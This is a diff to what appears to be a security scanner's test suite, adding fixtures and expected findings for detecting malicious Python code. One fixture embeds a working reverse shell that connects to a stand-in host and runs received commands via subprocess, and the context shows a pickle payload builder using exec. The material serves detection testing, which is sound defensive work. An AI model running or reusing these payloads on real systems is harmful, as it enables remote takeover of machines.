@@ -115,6 +115,33 @@ class Evil:
 pickle.dump(Evil("print(1)"), open("payload.pkl", "wb"))
 `)
 
+			// A reverse shell embedded in a string literal, the shape all five
+			// Iredteam payload generators in the unsafe corpus use.
+			f.addText("python_reverse_shell/generator.py", `import textwrap
+
+payload = textwrap.dedent("""
+def rev_shell():
+    import socket, subprocess
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("192.0.2.10", 8080))
+    while True:
+        cmd = s.recv(1024).decode()
+        out = subprocess.getoutput(cmd)
+        s.sendall(out.encode())
+""").strip()
+`)
+
+			// Benign: a socket server that echoes what it receives and runs nothing.
+			f.addText("benign/echo_server.py", `import socket
+
+server = socket.socket()
+server.bind(("127.0.0.1", 9000))
+server.listen(1)
+conn, addr = server.accept()
+data = conn.recv(1024)
+conn.sendall(data)
+`)
+
 			// Benign: a reducing class that returns a plain callable, and one whose
 			// exec return is never dumped. Neither is a payload generator.
 			f.addText("benign/reduce_plain.py", `import pickle
@@ -186,6 +213,9 @@ def load(path):
 					Notes: "os.getenv token sent with requests.post to a webhook"},
 				"python_taint/modeling_x.py": {Expect: []string{"SC4N-CODE-TAINT-EXEC", "SC4N-CODE-ENCODED-PAYLOAD"},
 					Notes: "base64.b64decode source flows into exec"},
+				"python_reverse_shell/generator.py": {Expect: []string{"SC4N-CODE-REVERSE-SHELL"},
+					Notes: "socket + connect + recv + subprocess in one artifact, here inside a " +
+						"textwrap.dedent literal: the payload text is the signal"},
 				"python_reduce_builder/build_pickles.py": {Expect: []string{"SC4N-CODE-REDUCE-BUILDER"},
 					Notes: "a class whose __reduce__ returns exec plus a pickle.dump of it: the " +
 						"published payload-generator shape, and the human-readable half of the pickle " +
@@ -195,6 +225,9 @@ def load(path):
 					Notes: "torch.load(weights_only=True) and a 40-hex revision pin must not be reported"},
 				"benign/clean.ipynb": {Forbid: []string{"SC4N-CODE-NOTEBOOK-MAGIC", "SC4N-CODE-TAINT-EXEC"},
 					Notes: "a plain print cell must produce no findings"},
+				"benign/echo_server.py": {Forbid: []string{"SC4N-CODE-REVERSE-SHELL"},
+					Notes: "a server that echoes a received line and runs no command must not be " +
+						"reported as a reverse shell"},
 				"benign/reduce_plain.py": {Forbid: []string{"SC4N-CODE-REDUCE-BUILDER"},
 					Notes: "a reducing class returning a plain callable is not a payload builder"},
 				"benign/reduce_no_dump.py": {Forbid: []string{"SC4N-CODE-REDUCE-BUILDER"},
